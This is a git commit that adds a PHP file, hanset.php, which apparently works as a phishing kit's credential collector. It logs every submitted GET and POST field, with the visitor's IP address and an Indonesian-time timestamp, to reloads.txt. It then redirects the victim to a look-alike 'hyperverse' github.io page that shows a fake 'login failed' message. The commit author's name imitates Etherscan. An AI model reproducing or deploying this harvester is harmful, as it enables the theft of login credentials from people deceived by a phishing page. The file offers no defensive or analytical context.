e449b9cf8b8f0d117f4fddcde9dead90af8a23a0
etherscan-erc <108395533+etherscan-erc@users.noreply.github.com>
2022-07-01 14:37:40 +0700

    Add files via upload

---
+++ hanset.php
@@ -0,0 +1,33 @@
+<?php
+header ('Location: Location: https://https://h5thehyperversee.github.io/h5-thehyperverse/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
+$handle = fopen("reloads.txt", "a");
+
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+$ip = $_SERVER['REMOTE_ADDR'];
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+
+fwrite($handle, ":Ip Address: $ip");
+fwrite($handle, "\r\n");
+fwrite($handle, ":Waktu Masuk: ".date('d-M-Y G:i:s A',  strtotime("+7 hours"))."\r\n");
+// assuming Indonesia timzone is GMT +7 and you want 24-hour format time
+// according to your comments below
+fclose($handle);
+exit;
+echo "<script images=\"JavaScript\">
+<!--
+window.location=\" https://h5thehyperversee.github.io/h5-thehyperverse/answer.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
+// -->
+</script>";
+?>
+
+?>
